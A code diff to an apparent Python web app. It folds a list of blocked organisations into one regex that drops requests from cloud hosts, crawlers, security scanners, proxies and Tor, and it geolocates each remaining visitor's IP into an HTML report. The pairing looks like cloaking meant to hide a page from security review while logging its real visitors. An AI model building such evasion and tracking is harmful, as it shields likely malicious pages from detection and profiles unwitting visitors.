@@ -1,5 +1,6 @@
 import json
 import os
+import re
 from datetime import datetime
 from functools import wraps
 from json.decoder import JSONDecodeError
@@ -156,37 +157,17 @@ def is_bot(ip, user_agent):
     ip = ip.strip().replace("/", "").replace("\\", "").strip()
     if ip == "127.0.0.1":
         return True
-    blocked_organizations = [
-        "facebook",
-        "netlify",
-        "cloudflare",
-        "vercel",
-        "github",
-        "gitlab",
-        "bitbucket",
-        "heroku",
-        "aws",
-        "azure",
-        "digitalocean",
-        "lighttpd",
-        "applebot",
-        "googlebot",
-        "bingbot",
-        "yandexbot",
-        "baidu",
-        "duckduckbot",
-        "pinterest",
-        "linkedin",
-        "twitter",
-    ]
-    if any(org in user_agent.lower() for org in blocked_organizations):
+
+    blocked_regex = r"(?i)\b(facebook|netlify|cloudflare|vercel|github|gitlab|bitbucket|heroku|aws|azure|digitalocean|lighttpd|applebot|googlebot|bingbot|yandexbot|baidu|duckduckbot|pinterest|linkedin|twitter|bot|crawler|spider|scraper|monitor|analytics|tracking|monitoring|probing|scanning|python|java|javascript|php|ruby|swift|kotlin|csharp|c|http|cloud|https|ftp|smtp|imap|pop|nntp|telnet|ssh|vpn|proxy|tor|ss|ssr|v2ray|trojan|wireguard)\b"
+
+    if re.search(blocked_regex, user_agent, re.IGNORECASE):
         return True
+
     try:
-        response = requests.get(f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
+        response = requests.get(
+            f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
         geo_data = response.json()
-        if "organization" in geo_data and any(
-            org in geo_data["organization"].lower() for org in blocked_organizations
-        ):
+        if "organization" in geo_data and re.search(blocked_regex, geo_data["organization"].lower()):
             return True
     except (RequestException, JSONDecodeError) as e:
         print(f"Error fetching geo data: {e}")
@@ -197,7 +178,8 @@ def is_bot(ip, user_agent):
 def send_visitor_info(ip, user_agent):
     ip = ip.strip().replace("/", "").replace("\\", "").strip()
     try:
-        response = requests.get(f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
+        response = requests.get(
+            f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
         geo_data = response.json()
     except (RequestException, JSONDecodeError) as e:
         print(f"Error fetching geo data: {e}")
@@ -218,7 +200,8 @@ def send_visitor_info(ip, user_agent):
     longitude = escape_html(str(geo_data.get("longitude", DEFAULT_VALUE)))
     timezone = escape_html(str(geo_data.get("timezone", DEFAULT_VALUE)))
     asn = escape_html(str(geo_data.get("asn", DEFAULT_VALUE)))
-    organization = escape_html(str(geo_data.get("organization", DEFAULT_VALUE)))
+    organization = escape_html(
+        str(geo_data.get("organization", DEFAULT_VALUE)))
 
     message = f"""
 <b>🖥️ User Agent:</b> <code>{user_agent}</code>
